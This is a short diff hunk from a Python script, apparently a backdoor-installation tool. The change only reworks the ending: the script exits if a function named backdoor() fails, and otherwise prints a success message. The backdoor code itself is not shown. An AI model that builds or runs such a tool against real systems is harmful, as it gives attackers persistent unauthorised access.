@@ -27,6 +27,8 @@ def backdoor():
     else: return True
 
 
-if backdoor():
-    print("[+] Backdoor created successfully!")
-    input("\n[+] Press enter to exit...")
+if not backdoor():
+    os._exit(1)
+
+print("[+] Backdoor created successfully!")
+input("\n[+] Press enter to exit...")
